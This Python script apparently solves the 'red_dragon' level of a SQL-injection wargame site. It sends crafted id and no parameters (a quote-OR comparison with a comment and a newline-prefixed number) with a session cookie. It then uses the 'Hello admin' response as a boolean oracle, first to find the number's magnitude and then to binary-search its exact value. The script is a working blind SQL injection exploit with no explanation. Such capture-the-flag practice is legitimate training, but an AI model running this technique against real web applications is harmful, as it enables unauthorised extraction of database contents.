import requests

url = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php"

cookie = {'PHPSESSID' : 'ovbfdu14h0vaeamskdlr10nttu'}

for ran in range(100):
  param = {'id':"'||no>%23", 'no':f"%0a{str(10 ** ran)}"}
  print(f'?id={param['id']}&no={param["no"]}')
  res = requests.get(url=url+f'?id={param['id']}&no={param["no"]}', cookies=cookie)
  if 'Hello admin' not in res.text:
    print(f'10^{ran-1} < no < 10^{ran}')
    break

left = 10 ** 8
right = 10 ** 9
while left<=right:
  mid = (left+right)//2

  param= {'id':"'||no>%23", 'no':f'%0a{mid}'}
  res = requests.get(url=url+ f'?id={param['id']}&no={param["no"]}', cookies=cookie)
  if "Hello admin" in res.text:
    left = mid + 1
  else:
    right = mid - 1
  print(left,right)
print(left,right)
